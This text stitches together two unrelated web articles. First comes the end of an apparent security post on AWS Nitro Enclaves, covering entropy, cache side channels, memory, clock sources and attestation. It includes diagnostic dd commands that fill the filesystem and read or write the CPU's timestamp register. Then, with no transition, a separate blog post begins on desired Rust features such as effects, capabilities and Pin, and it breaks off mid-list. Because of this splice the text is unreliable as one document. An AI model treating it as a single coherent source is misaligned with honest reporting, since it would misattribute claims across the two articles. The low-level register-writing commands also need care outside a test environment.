<p><strong>We recommend configuring your enclaves to explicitly check that the current RNG (<code>rng_current</code>) is set to <code>nsm-hwrng</code>.</strong> This check will ensure that the AWS Nitro RNG was successfully <a href="https://github.com/torvalds/linux/blob/0bbac3facb5d6cc0171c45c9873a2dc96bea9680/drivers/misc/nsm.c#L449-L452">registered</a> and that it’s the one the kernel uses periodically to add entropy.</p>
<p>To further boost the security of your enclave’s randomness, have it pull entropy from external sources whenever there are convenient sources available. A common external source is the AWS Key Management Service, which <a href="https://docs.aws.amazon.com/kms/latest/APIReference/API_GenerateRandom.html">provides a convenient <code>GenerateRandom</code> method</a> that enclaves can use to bring in entropy over an encrypted channel.</p>
<p>If you want to follow <a href="https://csrc.nist.gov/csrc/media/Presentations/2023/bridging-the-gap-between-the-sp-800-90-series-and/images-media/session-2-mckay-bridging-the-gap.pdf">NIST/AIS standards</a> (see section 5.3.1 in “<a href="https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Publications/Studies/LinuxRNG/LinuxRNG_EN_V4_5.pdf">Documentation and Analysis of the Linux Random Number Generator</a>”) or suspect <a href="https://en.wikipedia.org/wiki/RDRAND#Security_issues">issues</a> with the <code>RDRAND</code>/<code>RDSEED</code> instructions (see also this <a href="https://lwn.net/Articles/961121/">LWNet article</a> and <a href="https://x.com/pid_eins/status/1149649806056280069">this tweet</a>), you can disable the <code>random.trust_{bootloader,cpu}</code> kernel parameters. That will inform the kernel not to include these sources for estimation of available entropy.</p>
<p>Lastly, make sure that your enclaves use a kernel version greater than <a href="https://cdn.kernel.org/pub/linux/kernel/v5.x/ChangeLog-5.17.12"><code>5.17.12</code></a>—<a href="https://lore.kernel.org/lkml/20220527084855.501642285@linuxfoundation.org/">important changes were introduced</a> to the kernel’s random algorithm.</p>
<h3>Side channels</h3>
<p>Application-level timing side-channel attacks are a threat to enclaves, as they are to any application. <strong>Applications running inside enclaves must process confidential data in constant time.</strong> Attacks from the parent EC2 instance can use almost system-clock-precise time measurements, so don’t count on network jitter for mitigations. You can read more about timing attack vectors in our blog post “<a href="https://blog.trailofbits.com/2022/01/26/part-1-the-life-of-an-optimization-barrier/">The life of an optimization barrier</a>.”</p>
<p>Also, though this doesn’t really constitute a side-channel attack, error messages returned by an enclave can be used by attackers to reason about the enclave’s state. Think about issues like padding oracles and <a href="https://github.com/OWASP/CheatSheetSeries/blob/5391fd01d1a67cb780b335b922c778a2cc27d91f/cheatsheets/Authentication_Cheat_Sheet.md#authentication-and-error-messages">account enumeration</a>. <strong>We recommend keeping errors returned by enclaves as generic as possible.</strong> How generic errors should be will depend on the given business requirements, as users of any application will need some level of error tracing.</p>
<h3>CPU memory side channels</h3>
<p>The main type of side-channel attack to know about involves CPU memory. CPUs share some memory—most notably the <a href="https://en.wikipedia.org/wiki/CPU_cache">cache lines</a>. If memory is simultaneously accessible to two components from different trust zones—like an enclave and its parent EC2 instance—then it may be possible for one component to indirectly leak the other component’s data via measurements of memory access patterns. Even if an application processes secret data in constant time, attackers with access to this type of side channel can exploit data-dependent branching.</p>
<p>In a typical architecture, CPUs can be categorized into <a href="https://www.kernel.org/doc/html/v4.18/vm/numa.html">NUMA</a> nodes, CPU cores, and CPU threads. The smallest physical processing unit is the CPU core. The core may have multiple logical threads (virtual CPUs)—the smallest logical processing units—and threads share L1 and L2 cache lines. The L3 line (also called the last-level cache) is shared between all cores in a NUMA node.</p>

<p>Parent EC2 instances may have been allocated only a few CPU cores from a NUMA node. Therefore, they may share an L3 cache with other instances. However, the AWS white paper “<a href="https://docs.aws.amazon.com/whitepapers/latest/security-design-of-aws-nitro-system/the-ec2-approach-to-preventing-side-channels.html">The Security Design of the AWS Nitro System</a>” claims that the L3 cache is never shared <em>simultaneously</em>. Unfortunately, there is <a href="https://news.ycombinator.com/item?id=23667433">not much more information</a> on the topic.</p>

<p>What about CPUs in enclaves? CPUs are taken from the parent EC2 instance and assigned to an enclave. According to the AWS and <a href="https://github.com/aws/aws-nitro-enclaves-cli/blob/c4fafb2320bc13d1e74e6ba2c1b6ef840cba0988/bootstrap/nitro-cli-config#L545-L548"><code>nitro-cli</code> source code</a>, the hypervisor enforces the following:</p>
<ul>
<li>The CPU #0 core (all its threads) is not assignable to enclaves.</li>
<li>Enclaves must use full cores.</li>
<li>All cores assigned to an enclave must be from the same NUMA node.</li>
</ul>
<p>In the worst case, an enclave will share the L3 cache with its parent EC2 instance (or with other enclaves). However, whether the L3 cache can be used to carry out side-channel attacks is debatable. On one hand, the AWS white paper doesn’t make a big deal of this attack vector. On the other hand, recent research indicates the practicality of such an attack (see “<a href="https://www.cs.tau.ac.il/~mad/publications/asplos2024-llcfeasible.pdf">Last-Level Cache Side-Channel Attacks Are Feasible in the Modern Public Cloud</a>”).</p>
<p>If you are very concerned about L3 cache side-channel attacks, you can <strong>run the enclave on a full NUMA node</strong>. To do so, you would have to allocate more than one full NUMA node to the parent EC2 instance so that one NUMA node can be used for the enclave while saving some CPUs on the other NUMA node for the parent. Note that this mitigation is resource-inefficient and costly.</p>
<p>Alternatively, you can <strong>experiment with Intel’s <a href="https://www.intel.com/content/www/us/en/developer/articles/technical/introduction-to-cache-allocation-technology.html">Cache Allocation Technology</a></strong> (CAT) to isolate the enclave’s L3 cache (see <a href="https://github.com/intel/intel-cmt-cat/wiki/Usage-Examples#12-cache-allocation-technology-cat-usage">the <code>intel-cmt-cat</code> software</a>) from the parent. Note, however, that we don’t know whether CAT can be changed dynamically for a running enclave—that would render this solution unuseful.</p>
<p>If you implement any of the above mitigations, you will have to add relevant information to the attestation. Otherwise, users won’t be able to ensure that the L3 side-channel attack vector was really mitigated.</p>
<p>Anyway, you want your <strong>security-critical code (like cryptography) to be implemented with secrets-independent memory access patterns</strong>. Both hardware- and software-level security controls are important here.</p>
<h3>Memory</h3>
<p>Memory for enclaves is carved out from parent EC2 instances. It is the hypervisor’s responsibility to protect access to an enclave’s memory and to clear it after it’s returned to the parent. When it comes to enclave memory as an attack vector, developers really only need to worry about DoS attacks. <strong>Applications running inside an enclave should have limits on how much data external users can store.</strong> Otherwise, a single user may be able to consume all of an enclave’s available memory and crash the enclave (try running <code>cat /dev/zero</code> inside the enclave to see how it behaves when a large amount of memory is consumed).</p>
<p>So how much space does your enclave have? The answer is a bit complicated. First of all, the enclave’s init process doesn’t mount a new root filesystem, but keeps the initial <code>initramfs</code> and <a href="https://github.com/aws/aws-nitro-enclaves-sdk-bootstrap/blob/3f79674465f816eeffe4482e1240b792ff75d2d9/init/init.c#L428-L429"><code>chroots</code> to a directory</a> (though there is a <a href="https://github.com/aws/aws-nitro-enclaves-sdk-bootstrap/pull/25">pending PR</a> that will change this behavior once merged). This <a href="https://www.lightofdawn.org/blog/?viewDetailed=00128">puts some limits</a> on the filesystem’s size. Also, data saved in the filesystem will consume available RAM.</p>
<p>You can check the total available RAM and filesystem space by executing the free command inside the enclave. The filesystem’s size limit should be around 40–50% of that total space. You can confirm that by filling the whole filesystem’s space and checking how much data ends up being stored there:</p>
<pre>dd count=9999999999 if=/dev/zero &gt; /fillspace
du -h -d1 /
</pre>
<p>Another issue with memory is that the enclave doesn’t have any persistent storage. Once it is shut down, all its data is lost. Moreover, AWS Nitro doesn’t provide any specific <a href="https://www.intel.com/content/www/us/en/developer/articles/technical/introduction-to-intel-sgx-sealing.html">data sealing mechanism</a>. It’s your application’s responsibility to implement it. Read our blog post “<a href="https://blog.trailofbits.com/2023/12/18/a-trail-of-flipping-bits/">A trail of flipping bits</a>” for more information.</p>
<h3>Time</h3>
<p>A less common source of security issues is an enclave’s time source—namely, from where the enclave gets its time. An attacker who can control an enclave’s time could perform rollback and replay attacks. For example, the attacker could switch the enclave’s time to the past and make the enclave accept expired TLS certificates.</p>
<p>Getting a trusted source of time may be a somewhat <a href="https://www.intel.com/content/www/us/en/support/articles/000057968/software/intel-security-products.html">complex problem in the space of confidential computing</a>. Fortunately, enclaves can rely on the trusted hypervisor for delivery of secure clock sources. <strong>From the developer’s side, there are only three actions worth taking to improve the security and correctness of your enclave’s time sources:</strong></p>
<ul>
<li>Ensure that <code>current_clocksource</code> is set to <code>kvm-clock</code> in the enclave’s kernel configuration; consider even adding an application-level runtime check for the clock (in case something goes wrong during enclave bootstrapping and it ends up with a different clock source).</li>
<li>Enable the <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/set-time.html#connect-to-the-ptp-hardware-clock">Precision Time Protocol</a> for better clock synchronization between the enclave and the hypervisor. It’s like the Network Time Protocol (NTP) but works over a hardware connection. It should be more secure (as it has a smaller attack surface) and easier to <a href="https://github.com/aws/aws-nitro-enclaves-cli/issues/500">set up</a> than the NTP.</li>
<li>For security-critical functionalities (like replay protections) use <a href="https://en.wikipedia.org/wiki/Unix_time">Unix time</a>. Be careful with UTC and time zones, as <a href="https://en.wikipedia.org/wiki/Daylight_saving_time">daylight saving time</a> and <a href="https://cr.yp.to/proto/utctai.html">leap seconds</a> may “move time backwards.”</li>
</ul>
<h3>Why kvm-clock?</h3>
<p>Machines using an x86 architecture <a href="https://blog.trailofbits.com/2019/10/03/tsc-frequency-for-all-better-profiling-and-benchmarking/#:~:text=The%20trouble%20with%20timestamps">can have a few different sources of time</a>. We can use the following command to check the sources available to enclaves:</p>
<pre>cat /sys/devices/system/clocksource/clocksource0/available_clocksource
</pre>
<p>Enclaves should have two sources: <code>tsc</code> and <code>kvm-clock</code> (you can see them if you run <a href="https://github.com/aws/aws-nitro-enclaves-cli/tree/6cb66b8e617d296d23e0cc083495a0306cb92eef/samples/command_executer">a sample enclave</a> and check its sources); the latter is enabled by default, as can be checked in the <code>current_clocksource</code> file. How do these sources work?</p>
<p>The TSC mechanism is based on the <a href="https://en.wikipedia.org/wiki/Time_Stamp_Counter">Time Stamp Counter</a> register. It is a per-CPU monotonic counter implemented as a model-specific register (MSR). Every (virtual) CPU has its own register. The counter increments with every CPU cycle (<a href="https://oliveryang.net/2015/09/pitfalls-of-TSC-usage/#311-cpu-tsc-capabilities">more or less</a>). Linux computes the current time based on the counter scaled by the CPU’s frequency and some initial date.</p>
<p>We can read (and write!) TSC values if we have root privileges. To do so, we need the TSC’s offset (<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/include/asm/msr-index.h#L793">which is 16</a>) and its size (which is 8 bytes). MSR registers can be accessed through the <code>/dev/cpu</code> device:</p>
<pre>dd iflag=count_bytes,skip_bytes count=8 skip=16 if=/dev/cpu/0/msr
    dd if=&lt;(echo "34d6 f1dc 8003 0000" | xxd -r -p) of=/dev/cpu/0/msr seek=16 oflag=seek_bytes
</pre>
<p>The TSC can also be read with the <a href="https://linux.die.net/man/3/clock_gettime"><code>clock_gettime</code></a> method using the <code>CLOCK_MONOTONIC_RAW</code> clock ID, and with the <a href="https://www.felixcloutier.com/x86/rdtsc"><code>RDTSC</code> assembly instruction</a>.</p>
<p>Theoretically, if we change the TSC, the wall clock reported by <code>clock_gettime</code> with the <code>CLOCK_REALTIME</code> clock ID, by the <a href="https://linux.die.net/man/2/gettimeofday"><code>gettimeofday</code></a> function, and by the <a href="https://man7.org/linux/man-pages/man1/date.1.html"><code>date</code></a> command should change. However, the Linux kernel works hard to try to make TSCs behave reasonably and be synchronized with each other (for example, check out the <a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/kernel/tsc.c#L1142"><code>tsc</code> watchdog code</a> and functionality related to the <a href="https://www.spinics.net/lists/kvm/msg331239.html"><code>MSR_IA32_TSC_ADJUST</code></a> register). So breaking the clock is not that easy.</p>
<p>The TSC can be used to track time elapsed, but where do enclaves get the “some initial date” from which the time elapsed is counted? Usually, in other systems, that date is obtained using the NTP. However, enclaves do not have out-of-the-box access to the network and don’t use the NTP (see slide 26 of <a href="https://d1.awsstatic.com/events/reinvent/2020/Deep_dive_on_AWS_Nitro_Enclaves_for_apps_running_on_Amazon_EC2_SEC318.pdf">this presentation</a> from AWS’s 2020 re:Invent conference).</p>

<p>With the <code>tsc</code> clock and no NTP, the initial date is somewhat randomly selected—<a href="https://www.youtube.com/watch?v=d4sP9lB7z9o">the truth is</a> we haven’t determined where it comes from. You can force an enclave to boot without the <code>kvm-clock</code> by passing the <a href="https://wiki.archlinux.org/title/kernel_parameters"><code>no-kvmclock no-kvmclock-vsyscall</code> kernel parameters</a> (but note that these parameters should not be provided at runtime) and check the initial date for yourself. In our experiments, the date was:</p>
<pre>Tue Nov 30 00:00:00 UTC 1999
</pre>
<p>As you can see, the TSC mechanism doesn’t work well with enclaves. Moreover, it <a href="https://docs.kernel.org/virt/kvm/x86/timekeeping.html#virtualization-problems">breaks badly when the machine is virtualized</a>. Because of that, AWS introduced the <code>kvm-clock</code> as the default source of time for enclaves. It is an implementation of the paravirtual clock driver (pvclock) protocol (see <a href="https://opensource.com/article/17/6/timekeeping-linux-vms#pvclock:~:text=Xen%20and%20KVM%20hypervisors%20came%20up">this article</a> and <a href="https://rwmj.wordpress.com/2010/10/15/kvm-pvclock/">this blog post</a> for more info on pvclock). With this protocol, the host (the AWS Nitro hypervisor in our case) provides the <a href="https://www.kernel.org/doc/html/v6.8/virt/kvm/x86/msr.html?highlight=MSR_KVM_SYSTEM_TIME_NEW"><code>pvclock_vcpu_time_info</code> structure</a> to the guest (the enclave). The structure contains information that enables the guest to adjust its time measurements—most notably, the host’s wall clock (<code>system_time</code> field), which is used as the initial date.</p>
<p>Interestingly, the guest’s userland applications can use the TSC mechanism even if the kvm-clock is enabled. That’s because the RDTSC instruction is (<a href="https://www.spinics.net/lists/kvm/msg330980.html">usually</a>) <a href="https://oliveryang.net/2015/09/pitfalls-of-TSC-usage/#311-cpu-tsc-capabilities:~:text=The%20drawbacks%20of%20kvmclock%20is%20that%20user%20space%20TSC%20read%20will%20still%20have%20the%20problem.">not emulated</a> and therefore may provide non-adjusted TSC register readings.</p>
<p>Please note that if your enclaves use different clock sources or enable NTP, you should do some additional research to see if there are related security issues.</p>
<h3>Attestation</h3>
<p>Cryptographic attestation is the source of trust for end users. It is essential that users correctly parse and validate attestations. Fortunately, <a href="https://github.com/aws/aws-nitro-enclaves-nsm-api/blob/main/docs/attestation_process.md">AWS provides good documentation</a> on how to consume attestations.</p>
<p>The most important attestation data is protocol-specific, but <strong>we have a few generally applicable tips for developers to keep in mind</strong> (in addition to what’s written in the AWS documentation):</p>
<ul>
<li>The enclave should enforce a minimal nonce length.</li>
<li>xUsers should check the timestamp provided in the attestation in addition to nonces.</li>
<li>The attestation’s timestamp should not be used to reason about the enclave’s time. This timestamp may differ from the enclave’s time, as the former is generated by the hypervisor, and the latter by whatever clock source the enclave is using.</li>
<li><a href="https://blog.trailofbits.com/2019/07/08/fuck-rsa/">Don’t use RSA</a> for the <code>public_key</code> feature.</li>
</ul>
<h3>The NSM driver</h3>
<p>Your enclave applications will use the NSM driver, which is accessible via the <code>/dev/nsm</code> node. Its source code can be found in the <a href="https://github.com/aws/aws-nitro-enclaves-sdk-bootstrap/blob/main/nsm-driver/nsm.c"><code>aws-nitro-enclaves-sdk-bootstrap</code></a> and <a href="https://github.com/torvalds/linux/blob/b9873755a6c8ccfce79094c4dce9efa3ecb1a749/drivers/misc/nsm.c"><code>kernel</code></a> repositories. Applications communicate with the driver via the <code>IOCTL</code> system call and can use the <a href="https://github.com/aws/aws-nitro-enclaves-nsm-api/blob/4b851f3006c6fa98f23dcffb2cba03b39de9b8af/src/driver/mod.rs#L87-L87"><code>nsm-api</code> library</a> to do so.</p>
<p><strong>Developers should be aware that applications running inside an enclave may misuse the driver or the library.</strong> However, there isn’t much that can go wrong if developers take these steps:</p>
<ul>
<li>The driver lets you <a href="https://github.com/aws/aws-nitro-enclaves-nsm-api/blob/v0.4.0/nsm-lib/src/lib.rs#L118">extend and lock</a> more platform configuration registers (PCRs) than <a href="https://docs.aws.amazon.com/enclaves/latest/user/set-up-attestation.html#where">the basic 0–4 and 8</a> PCRs. Locked PCRs cannot be extended, and they are included in enclave attestations. How these additional PCRs are used depends on how you configure your application. Just make sure that it distinguishes between locked and unlocked ones.</li>
<li>Remember to make the application check the PCRs’ <a href="https://github.com/aws/aws-nitro-enclaves-nsm-api/blob/4b851f3006c6fa98f23dcffb2cba03b39de9b8af/nsm-lib/src/lib.rs#L94-L94">lock state</a> properties when sending the <code>DescribePCR</code> request to the NSM driver. Otherwise, it may be consulting a PCR that may still be manipulated.</li>
<li>Requests and responses are CBOR-encoded. Make sure to get the encoding right. Incorrectly decoded responses may provide false data to your application.</li>
<li>It is not recommended to use the <a href="https://github.com/aws/aws-nitro-enclaves-nsm-api/blob/4b851f3006c6fa98f23dcffb2cba03b39de9b8af/nsm-lib/src/lib.rs#L250-L250"><code>nsm_get_random</code></a> method directly. It skips the kernel’s algorithm for mixing multiple entropy sources and therefore is more prone to errors. Instead, use common randomness APIs (like <code>getrandom</code>).</li>
<li>The <a href="https://github.com/aws/aws-nitro-enclaves-nsm-api/pull/54"><code>nsm_init</code></a> method returns <code>-1</code> on error, which is an unusual behavior in Rust, so make sure your application accounts for that.</li>
</ul>
<h3>That’s (not) all folks</h3>
<p>Securing AWS Nitro Enclaves requires vigilance across multiple attack vectors. By implementing the recommendations in this post—from hardening virtual sockets to verifying randomness sources—you can significantly reduce the risk of compromise to your enclave workloads, helping shape a more secure future for confidential computing.</p>
<p>Key takeaways:</p>
<ol>
<li>Treat enclaves as a single trust zone and implement end-to-end security.</li>
<li>Mitigate side-channel risks through proper CPU allocation and constant-time processing.</li>
<li>Verify enclave entropy sources in the runtime.</li>
<li>Use the right time sources inside the enclave.</li>
<li>Implement robust attestation practices, including nonce and timestamp validation.</li>
</ol>
<p>For more security considerations, see our first post on <a href="https://blog.trailofbits.com/2024/02/16/a-few-notes-on-aws-nitro-enclaves-images-and-attestation/">enclave images and attestation</a>. If your enclave uses external systems—like <a href="https://docs.aws.amazon.com/enclaves/latest/user/kms.html">AWS Key Management Service</a> or <a href="https://docs.aws.amazon.com/enclaves/latest/user/nitro-enclave-refapp.html">AWS Certificate Manager</a>—review the systems and supporting tools for additional security footguns.</p>

<div id="readability-page-1" class="page"><section>
                <p>The Rust programming language feels like a first generation product.</p>

<p>You know what I mean. Like the first iPhone - <a href="https://www.youtube.com/watch?v=MnrJzXM7a6o">which was amazing by the way</a>. They made an entire operating system around multitouch. A smart phone with no keyboard. And a working web browser. Within a few months, we all realised what the iPhone really wanted to be. Only, the first generation iphone wasn't quite there. It didn't have 3G internet. There was no GPS chip. And there was no app store. In the next few years, iPhones would get a lot better.</p>

<p>Rust feels a bit like that first iPhone.</p>

<p>I fell in love with Rust at the start. Algebraic types? Memory safety without compromising on performance? A modern package manager? Count me in. But now that I've been programming in rust for 4 years or so, it just feels like its never quite there.</p>

<p>And I don't know if it will ever be there. Progress on the language has slowed <em>so much</em>. When I first started using it, every release seemed to add new, great features in stable rust. Now? Crickets. The <a href="https://doc.rust-lang.org/unstable-book/the-unstable-book.html">rust "unstable book"</a> lists <em>700</em> different unstable features - which presumably are all implemented, but which have yet to be enabled in stable rust. Most of them are changes to the standard library - but seriously. Holy cow.</p>

<p>How much of this stuff will <em>ever</em> make it into the language proper? The rust RFC process is a graveyard of good ideas.</p>

<p>Features like <a href="https://doc.rust-lang.org/unstable-book/language-features/coroutines.html">Coroutines</a>. This RFC is 7 years old now. Make no mistake - coroutines are implemented in the compiler. They're just, not available for us "stable rust" peasants to use. If coroutines were a child, they would be in grade school by now. At this point, the coroutines RFC has lasted longer than World War 1 or 2.</p>

<p>I suspect rust is calcifying because its consensus process just doesn't scale. Early on, rust had a small group of contributors who just <em>decided</em> things. The monsters. Now, there are issue threads like <a href="https://github.com/rust-lang/rust/issues/93740#issuecomment-1041391284">this</a>, in which 25 smart, well meaning people spent 2 years and over 200 comments trying to figure out how to improve <code>Mutex</code>. And as far as I can tell, in the end they more or less gave up.</p>

<p>Maybe this is by design. Good languages are stable languages. It might be time to think of rust as a fully baked language - warts and all. Python 2.7 for life.</p>

<p>But that doesn't change anything for me. I want a better rust, and I feel powerless to make that happen. Where are my coroutines? Even javascript has <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/function*">coroutines</a>.</p>

<h2 id="fantasylanguage">Fantasy language</h2>

<p>Sometimes I lie awake at night fantasising about forking the compiler. I know how I'd do it. In my fork, I'd leave all the rust stuff alone and but make my own "seph" <a href="https://doc.rust-lang.org/edition-guide/editions/">edition</a> of the rust language. Then I could add all sorts of breaking features to that edition. So long as my compiler still compiles mainline rust as well, I could keep using all the wonderful crates on Cargo.</p>

<p>I think about this a lot. If I did it, here's what I'd change:</p>

<h3 id="functiontraitseffects">Function traits (effects)</h3>

<p>Rust has traits on structs. These are used in all sorts of ways. Some are markers. Some are understood by the compiler (like <code>Copy</code>). Some are user defined.</p>

<p>Rust should also define a bunch of traits for functions. In other languages, function traits are called "effects".</p>

<p>This sounds weird at first glance - but hear me out. See, there's lots of different "traits" that functions have. Things like:</p>

<ul>
<li>Does the function ever panic?</li>
<li>Does the function have a fixed stack size?</li>
<li>Does the function run to the end, or does it yield / await?</li>
<li>If the function is a coroutine, what is the type of the continuation?</li>
<li>Is the function "pure" (ie, the same input produces the same output, and it has no side effects)</li>
<li>Does the function (directly or indirectly) run unsafe code in semi-trusted libraries?</li>
<li>Is the function guaranteed to terminate?</li>
</ul>

<p>And so on.</p>

<p>A function's parameters and return type are just associated types on the function:</p>

<pre><code>fn some_iter() -&gt; impl Iterator&lt;Item = usize&gt; {  
    vec![1,2,3].into_iter()
}

fn main() {  
    // Why doesn't this work already via FnOnce?
    let x: some_iter::Output = some_iter();
}
</code></pre>

<p><a href="https://rust-lang.github.io/rfcs/2515-type_alias_impl_trait.html">TAIT</a> eat your heart out.</p>

<p>Exposing these properties is super useful. For example, the linux kernel wants to guarantee (at compile time) that some block of code will never panic. This is impossible to do in rust today. But using function traits, we could explicitly mark a function as being able - or unable - to panic:</p>

<pre><code>#[disallow(Panic)] // Syntax TBD.
fn some_fn() { ... }  
</code></pre>

<p>And if the function does anything which could panic (even recursively), the compiler would emit an error.</p>

<p>The compiler already sort of implements traits on functions, like <code>Fn</code>, <code>FnOnce</code> and <code>FnMut</code>. But for some reason they're anemic. (Why??)</p>

<p>I want something like this:</p>

<pre><code>/// Automatically implemented on all functions.
trait Function {  
  type Args,
  type Output,
  type Continuation, // Unit type () for normal functions
  // ... and so on.

  fn call_once(self, args: Self::Args) -&gt; Self::Output;
}

trait NoPanic {} // Marker trait, implemented automatically by the compiler.

/// Automatically implemented on all functions which don't recurse.
trait KnownStackSize {  
  const STACK_SIZE: usize,
}
</code></pre>

<p>Then you could write code like this:</p>

<pre><code>fn some_iter() -&gt; impl Iterator&lt;Item = usize&gt; {  
  vec![1,2,3].into_iter();
}

struct SomeWrapperStruct {  
  iter: some_iter::Output, // In 2024 this is still impossible in stable rust.
}
</code></pre>

<p>Or with coroutines:</p>

<pre><code>coroutine fn numbers() -&gt; impl Iterator&lt;Item = usize&gt; {  
  yield 1;
  yield 2;
  yield 3;
}

coroutine fn double&lt;I: Iterator&lt;Item=usize&gt;&gt;(inner: I) -&gt; impl Iterator&lt;Item = usize&gt; {  
  for x in inner {
    yield x * 2;
  }
}

struct SomeStruct {  
  // Suppose we want to store the iterator. We can name it directly:
  iterator: double&lt;numbers&gt;::Continuation,
}
</code></pre>

<p>Or, say, take a function parameter but require that the parameter itself doesn't panic:</p>

<pre><code>fn foo&lt;F&gt;(f: F)  
    where F: NoPanic + FnOnce() -&gt; String
{ ... }
</code></pre>

<p>Yoshua Wuyts has an excellent <a href="https://blog.yoshuawuyts.com/extending-rusts-effect-system/">talk &amp; blog post</a> going into way more detail about effects - why they're useful and how this could work.</p>

<h3 id="compiletimecapabilities">Compile-time Capabilities</h3>

<p>Most rust projects pull in an insane number of 3rd party crates. Most of these crates are small utility libraries - like the <a href="https://crates.io/crates/human-size"><code>human-size</code></a> crate which formats file sizes for human consumption. Great stuff! But unfortunately, all of these little crates add supply chain risk. Any of those authors could push out an update which contains malicious code - cryptolockering our computers, our servers or sneaking bad code into our binaries.</p>

<p>I think this problem is similar to the problem of memory safety. Sure - its sometimes useful to write memory-unsafe code. The rust standard library is full of it. But rust's <code>unsafe</code> keyword lets authors opt in to potentially unsafe things. We only add <code>unsafe</code> blocks when its necessary.</p>

<p>Lets do the same thing for privileged function calls - like reading and writing to and from the filesystem or the network. This is useful stuff, but its potentially dangerous. Developers should actively whitelist code that is allowed to call these functions.</p>

<p>To implement this, first we want to add marker traits to all the security-sensitive functions in the standard library (opening a file from a string, <code>exec</code>, FFI, opening network connections, most unsafe functions that interact with raw pointers, and so on). So, for example, <a href="https://doc.rust-lang.org/std/fs/fn.write.html"><code>std::fs::write(path, contents)</code></a> writes to an arbitrary path on disk with the credentials of the user. We add some <code>#[cap(fs_write)]</code> marker tag to the function itself, marking that this can only be called from code which is in some way trusted. The compiler automatically "taints" any other functions which call <code>write</code> in the entire call tree.</p>

<p>Suppose I call a function in a 3rd party crate which needs the <code>fs_write</code> capability. In order to call that function, I need to explicitly whitelist that call. (Either by adding the permission explicitly in my <code>Cargo.toml</code> or maybe with an annotation at the call site).</p>

<p>So, lets say the <code>foo</code> crate contains a function like this. The function will be marked (tainted) with the "writes to filesystem" tag:</p>

<pre><code>// In crate `foo`.

// (this function is implicitly tagged with #[cap(fs_write)])
pub fn do_stuff() {  
  std::fs::write("blah.txt", "some text").unwrap();
}
</code></pre>

<p>When I try to run that function from my code:</p>

<pre><code>fn main() {  
  foo::do_stuff();
}
</code></pre>

<p>The compiler can give me a nice rusty error, like this:</p>

<pre><code>Error: foo::do_stuff() writes to the local filesystem, but the `foo` crate has not been trusted with this capability in Cargo.toml.

Tainted by this line in do_stuff:

  std::fs::write("blah.txt", "some text").unwrap();

Add this to your Cargo.toml to fix:

foo = { version = "1.0.0", allow_capabilities: ["fs_write"] }  
</code></pre>

<p>Obviously, most uses of <code>unsafe</code> would also require explicit whitelisting.</p>

<p>Most crates I use - like <code>human-size</code> or <code>serde</code> don't need any special capabilities to work. So we don't need to worry so much about their authors "turning evil" and adding malicious code to our software. Reducing the supply chain risk from the 100 or so crates I currently transitively depend on down to just a few would be massive.</p>

<p>This is a very simple, static way that capabilities could be introduced to Rust. But it might be possible &amp; better to change privileged code to require an extra <code>Capability</code> parameter (some unit struct type). And heavily restrict how <code>Capability</code> objects can be instantiated. Eg:</p>

<pre><code>struct FsWriteCapability;

impl FsWriteCapability {  
    fn new() { Self } // Only callable from the root crate
}

// Then change std::fs::write's signature to this:
pub fn write(path: Path, contents: &amp;[u8], cap: FsWriteCapability) { ... }  
</code></pre>

<p>This requires more boilerplate, but its much more flexible. (And obviously, we'd also need to, somehow, apply a similar treatment to <code>build.rs</code> scripts and <code>unsafe</code> blocks.)</p>

<p>The result of all of this is that utility crates become "uncorruptable". Imagine if crates.io is hacked and serde is maliciously updated to include with cryptolocker code. Today, that malicious code would be run automatically on millions of developer machines, and compiled into programs everywhere. With this change, you'd just get a compiler error.</p>

<p>This is huge, and singlehandedly this one feature is probably worth the cost of forking rust. At least, to someone. (Anyone want to sponsor this work?)</p>

<h3 id="pinmoveandstructborrows">Pin, Move and Struct Borrows</h3>

<blockquote>
  <p>Feel free to skip this section if Pin &amp; the borrow checker gives you a migraine.</p>
</blockquote>

<p><code>Pin</code> in rust is a weird, complicated hack to work around a hole in the borrow checker. Its a band-aid from the land of bizzaro choices that only make sense when you need to maintain backwards compatibility at all costs.</p>

<ul>
<li>Its the reverse of the trait you actually want. It would make way more sense to have a <code>Move</code> marker trait (like <code>Copy</code>) indicating objects which <em>can</em> move.</li>
<li>But <code>Pin</code> isn't an actual trait. There's only <code>Unpin</code> (double negative now) and <code>!Unpin</code> - which is not-not-not-<code>Move</code>. For example <a href="https://doc.rust-lang.org/1.81.0/src/core/marker.rs.html#923"><code>impl !Unpin for PhantomPinned</code></a>. Is <code>!Unpin</code> the same as <code>Pin</code>? Uhhhh, ... No? Because .. reasons? I get an instant headache when I think about this stuff. Here's the <a href="https://doc.rust-lang.org/std/marker/trait.Unpin.html">documentation for Unpin</a> if you want to try your luck.</li>
<li>Pin only applies to reference types. If you read through code which uses <code>Pin</code> a lot, you'll find unnecessary <code>Box</code>-ing of values <em>everywhere</em>. For example, <a href="https://docs.rs/tokio-stream/latest/src/tokio_stream/wrappers/broadcast.rs.html#11-18">in tokio</a>, or helper libraries like <a href="https://lib.rs/crates/ouroboros">ouroboros</a>, <a href="https://docs.rs/async-trait/latest/async_trait/">async<em>trait</em></a><em> and <a href="https://docs.rs/self_cell/latest/self_cell/">self</a></em><a href="https://docs.rs/self_cell/latest/self_cell/">cell</a>.</li>
<li>The pain spreads. Any function that takes a pinned value needs the value wrapped using some horrible abomonation <a href="https://doc.rust-lang.org/std/future/trait.Future.html">like <code>Future::poll(self: Pin&lt;&amp;mut Self&gt;, ..)</code></a>. And then you need to figure out how to read the actual values out using projections, which are so complicated there are <a href="https://docs.rs/pin-project/latest/pin_project/">multiple</a> <a href="https://crates.io/crates/pin-project-lite/">crates</a> for dealing with them. The pain cannot be confined. It spreads outwards, forever, corrupting everything.</li>
</ul>

<p>I swear, it took more effort to learn pinning in rust than it took me to learn the entire Go programming language. And I'm still not convinced I'm totally across it. And I'm not alone. I've heard the <a href="https://fuchsia.dev/">Fuchsia operating system project</a> abandoned Rust for C++ in some parts because of how impossibly complex Pin makes everything.</p>

<p>Why is <code>Pin</code> needed, anyway?</p>

<p>We can write rust functions like this:</p>

<pre><code>fn main() {  
    let x = vec![1,2,3];
    let y = &amp;x;

    //drop(x); // error[E0505]: cannot move out of `x` because it is borrowed
    dbg!(y);
}
</code></pre>

<p>All variables in a rust function are actually, secretly in one of 3 different states:</p>

<ul>
<li>Normal (owned)</li>
<li>Borrowed</li>
<li>Mutably borrowed</li>
